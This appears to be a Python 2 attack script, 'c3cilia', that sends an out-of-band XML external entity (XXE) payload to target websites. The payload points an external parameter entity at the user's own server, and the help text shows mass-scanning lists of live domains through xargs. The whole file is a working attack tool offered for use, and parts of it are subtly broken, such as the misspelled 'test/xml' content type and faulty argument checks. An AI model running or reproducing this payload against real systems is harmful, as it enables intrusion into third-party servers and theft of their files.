#importing important lib 
import requests
import sys

blink = '\33[5m'
cyan ='\033[36m'
yellow ='\033[33m'

print (yellow)
print " .-----------------------------.           "
print " |  Hi Hackers                 |           "
print (" |  Tool   : "+ cyan + "c3cilia           "+yellow+   "|")
print " |  Author : @karthi_the_hacker|           "
print " |           Jai Hind          |           "
print " '-----------------------------'           "
print "                 ^      (\_/)    "
print "                 '----- (O.o)    "
print "                        (> <)    "
print " "


def psend():
	#getting CLI arg
	url = sys.argv[5]
	server = sys.argv[2]
	#setting data for post request
	proxies = {"http": "http://127.0.0.1:7777", "https": "http://127.0.0.1:7777"}
	header = {'Content-Type': 'test/xml'}
	agent = {'User-Agent': 'karthi_the_hacker'}
	entity = '<?xml version=\"1.0\" ?>\r\n<!DOCTYPE xxeElement [\r\n<!ELEMENT xxeElement ANY >\r\n<!ENTITY % emails SYSTEM \"'
	entity += server + '\">'
	entity += '\r\n%emails;\r\n%content;\r\n]>\r\n<email>&emails;</email>'
	#sending post request
	x = requests.post(url, data=entity , proxies=proxies, headers=header , verify=False)
	

def send():
	#getting CLI arg
	url = sys.argv[4]
	server = sys.argv[2]
	header = {'Content-Type': 'test/xml'}
	agent = {'User-Agent': 'karthi_the_hacker'}
	entity = '<?xml version=\"1.0\" ?>\r\n<!DOCTYPE xxeElement [\r\n<!ELEMENT xxeElement ANY >\r\n<!ENTITY % emails SYSTEM \"'
	entity += server + '\">'
	entity += '\r\n%emails;\r\n%content;\r\n]>\r\n<email>&emails;</email>'
	#sending post request
	x = requests.post(url, data=entity , headers=header , verify=False)
	


def helpl():
	print (cyan + "For single domain   : " + yellow + "python c3cilia.py --url http://yourserver.com/ --target https://target.com/")
	print (cyan + "For multiple domain : " + yellow + "cat live-domain.txt | xargs -n1 -p50 python c3cilia.py -u http://yourserver.com/ -t " + yellow)
	print (cyan + "For multiple domain with proxy : " + yellow + "cat live-domain.txt | xargs -n1 -p50 python c3cilia.py -u http://yourserver.com/ -p -t " + yellow)
	print (cyan + "For single domain with proxy   : " + yellow + "python c3cilia.py --url http://yourserver.com/ --proxy --target https://target.com/")


if (len(sys.argv)<=1):
	print("You must provide a target. Use -h or --help for help.")
	print(" ")
	sys.exit()

if (str(sys.argv[1]) == "-h" or str(sys.argv[1]) == "--help"):
	helpl()
	sys.exit()

elif (len(sys.argv) == 5 and str(sys.argv[1]) == "-u" or str(sys.argv[1]) == "--url" and str(sys.argv[3]) == "-t" or str(sys.argv[3]) == "--target"):
	send()

elif (len(sys.argv) == 6 and str(sys.argv[1]) == "-u" or str(sys.argv[1]) == "--url" and str(sys.argv[3]) == "-p" or str(sys.argv[3]) == "--proxy" and str(sys.argv[4]) == "-t" or str(sys.argv[4]) == "--target"):
	print ("proxy")
	psend()





